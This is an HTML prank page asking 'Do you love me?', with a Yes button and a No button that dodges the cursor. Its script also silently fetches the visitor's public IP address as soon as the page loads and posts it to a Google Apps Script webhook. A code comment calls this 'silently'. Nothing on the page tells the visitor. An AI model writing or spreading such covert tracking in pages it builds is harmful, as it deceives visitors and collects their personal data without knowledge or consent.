<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Do You Love Me?</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: #fff0f5;
      margin-top: 50px;
    }
    .btn {
      padding: 12px 25px;
      font-size: 20px;
      margin: 20px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    .yes { background-color: #4CAF50; color: white; }
    .no { background-color: #f44336; color: white; position: relative; }
    img { width: 250px; margin-top: 20px; }
  </style>
</head>
<body>

  <h1>Do you love me?</h1>
  <img id="gif" src="ask.gif" alt="Ask GIF" />

  <div>
    <button class="btn yes" onclick="yes()">Yes</button>
    <button class="btn no" onmouseover="moveNo()">No</button>
  </div>

  <h2 id="msg"></h2>

  <script>
    const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbyJbMUN18urZKeqrzcrb-HmN2XCOGr20Um1EuK5b_6bZ8_aMlAqwcUkBdnbfCLAHpQV/exec";

    // Send IP address to Google Sheet silently
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        fetch(`${WEBHOOK_URL}?ip=${data.ip}`, { method: "POST" });
      });

    // Button functions
    function yes() {
      document.getElementById("gif").src = "yes.gif";
      document.getElementById("msg").innerText = "I knew it! You love me ‚ù§Ô∏è";
    }

    function moveNo() {
      const btn = document.querySelector(".no");
      btn.style.position = "absolute";
      btn.style.top = Math.random() * 400 + "px";
      btn.style.left = Math.random() * 300 + "px";
      document.getElementById("gif").src = "no.gif";
      document.getElementById("msg").innerText = "Aww, bakit naman üò¢";
    }
  </script>
</body>
</html>
